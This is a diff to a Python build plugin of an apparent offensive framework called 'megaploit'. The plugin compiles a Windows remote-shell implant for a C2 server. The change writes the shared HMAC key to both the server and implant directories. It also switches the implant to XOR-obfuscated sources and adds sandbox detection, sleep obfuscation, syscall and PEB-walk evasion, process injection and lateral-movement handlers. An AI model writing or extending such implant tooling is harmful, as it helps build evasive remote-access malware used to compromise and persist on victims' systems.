@@ -196,31 +196,40 @@ def crs_build(args: list[str], ctx: PluginContext) -> str:
     except OSError as e:
         return f"[-] Could not write build config header: {e}"
 
-    key_file = os.path.join(os.getcwd(), "secret.key")
-    hex_key  = raw_key.hex()   # 64-char hex string for secret.key
-    try:
-        with open(key_file, "wb") as f:
-            f.write(hex_key.encode())
-    except OSError as e:
-        return f"[-] Could not write secret.key: {e}"
+    key_file        = os.path.join(os.getcwd(), "secret.key")
+    submodule_key   = os.path.join(root, "secret.key")
+    hex_key         = raw_key.hex()   # 64-char hex string for secret.key
+    # Write the key to both the server CWD (used by the Python C2) and the
+    # C-remote-shell submodule directory (used by manual `make` builds).
+    # Both files must contain the identical key or the HMAC auth will fail.
+    for _kpath in (key_file, submodule_key):
+        try:
+            with open(_kpath, "wb") as f:
+                f.write(hex_key.encode())
+        except OSError as e:
+            return f"[-] Could not write secret.key to {_kpath}: {e}"
 
     from megaploit.core.crypto import key_fingerprint
     fp = key_fingerprint(raw_key)
     lines.append(f"[+] Key generated  fingerprint={fp}")
     lines.append(f"[+] secret.key written \u2192 {key_file}")
 
-    # Full source list — must match CLIENT_SRCS in C-remote-shell/Makefile
+    # Full source list — must match CLIENT_SRCS in C-remote-shell/Makefile.
+    # Uses the *_obf.c variants (XOR-obfuscated string literals) and includes
+    # the sandbox and sleep_obf modules added in the current refactor.
     _client_srcs = [
         "client/core/main.c",
-        "client/evasion/spoof.c",
+        "client/evasion/spoof_obf.c",
         "client/evasion/peb_walk.c",
-        "client/evasion/syscall.c",
-        "client/evasion/evasion.c",
+        "client/evasion/syscall_obf.c",
+        "client/evasion/evasion_obf.c",
+        "client/evasion/sandbox.c",
+        "client/evasion/sleep_obf.c",
         "client/core/ntcalls.c",
         "client/shell/shell.c",
-        "client/shell/handlers_system.c",
+        "client/shell/handlers_system_obf.c",
         "client/shell/handlers_ui.c",
-        "client/shell/handlers_lateral.c",
+        "client/shell/handlers_lateral_obf.c",
         "client/inject/inject.c",
         "tls/tls_client.c",
     ]
@@ -254,7 +263,7 @@ def crs_build(args: list[str], ctx: PluginContext) -> str:
         libs = [
             "-Wl,--gc-sections", "-Wl,--strip-all",
             "-lsecur32", "-lcrypt32", "-lws2_32", "-lbcrypt",
-            "-ladvapi32", "-luser32", "-lshell32", "-mwindows",
+            "-ladvapi32", "-luser32", "-lshell32", "-liphlpapi", "-mwindows",
         ]
         cmd = [compiler] + cflags + srcs + ["-o", out] + libs
 
